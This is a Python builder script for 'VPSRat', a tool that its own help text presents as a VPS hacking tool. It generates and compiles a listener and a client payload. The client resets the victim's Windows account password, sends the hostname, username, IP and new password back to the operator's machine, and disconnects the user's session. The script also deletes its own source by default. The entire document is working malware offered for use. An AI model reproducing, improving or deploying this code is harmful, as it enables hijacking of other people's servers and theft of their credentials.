import socket
import os
import shutil
import argparse
import sys


if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(add_help=False)
        parser.add_argument('--help', action=argparse.BooleanOptionalAction)
        parser.add_argument('--source', action=argparse.BooleanOptionalAction)
        parser.add_argument('--setup', action=argparse.BooleanOptionalAction)
        args = parser.parse_args()
        if args.help:
            print("""VPSRat is a Virtual Private Server hacking tool,
pretty simple it justs resets the VPS password and sends it to your server.

Arguments [python setup.py [args]]:
--help | Shows this message.
--source | Keeps the source code of the server & client files.
--setup | Keeps the setup file.
""")
            os.system("pause")
            sys.exit()
        print("Gathering computer information..")
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        cwd = os.getcwd()
        print("Done\n")

        print("Making files..")
        server = open("server.py", "x")
        server.write('''import socket
import json
import threading


def send_data(tmp):
    data = json.loads(tmp.decode('utf-8'))
    host = data["host"]
    user = data["user"]
    ipv4 = data["ipv4"]
    password = data["password"]
    print(f"""Rat data has been sent
Hostname: {host}
Username: {user} 
IPV4: {ipv4}
Password: {password}
""")


if __name__ == "__main__":
    s = socket.socket()
    print('Socket created.')

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    s.bind((IPAddr, 10110))
    print('Socket binded with', IPAddr, 'and established connection to port: 10110.')

    s.listen(1)
    print("Waiting for data..")
    print()
    while True:
        c, addr = s.accept()
        tmp = c.recv(1024)
        thread = threading.Thread(target=send_data, args=(tmp, ))
        thread.start()
        thread.join()
''')
        server.close()

        client = open("client.py", "x")
        client.write('''import socket
import os
import json
import binascii
import getpass


if __name__ == "__main__":
    c = socket.socket()
    c.connect(("''' + IPAddr + '''", 10110))
    hostname = socket.gethostname()
    username = getpass.getuser()
    IPAddr = socket.gethostbyname(hostname)

    tmp = str(binascii.b2a_hex(os.urandom(16)))
    temp = tmp.replace("b", "")
    password = temp.replace("'", "")

    os.system("net user ", username, password)

    data = {
        "host" : hostname,
        "user" : username,
        "ipv4" : IPAddr,
        "password" : password
    }
    json_data = json.dumps(data).encode('utf-8')
    c.send(json_data)

    os.system("tsdiscon")
''')
        client.close()

        print("Done\n")
        print("Compiling python files..")
        os.system(f"pyinstaller --onefile server.py")
        os.system(f"pyinstaller --onefile client.py")
        print("Done\n")
        print("Deleting unnecessary files..")
        shutil.move(f"{cwd}\dist\server.exe" , f"{cwd}")
        shutil.move(f"{cwd}\dist\client.exe" , f"{cwd}")
        shutil.rmtree('build', ignore_errors=True)
        shutil.rmtree('dist', ignore_errors=True)
        os.remove("client.spec")
        os.remove("server.spec")
        if args.source is None:
            os.remove("server.py")
            os.remove("client.py")
        if args.setup is None:
            os.remove("setup.py")
        print("Done\n")
        print("Successfully finished setup for VPSRat.")
    except Exception as e:
        print(f"Setup error: {e}")
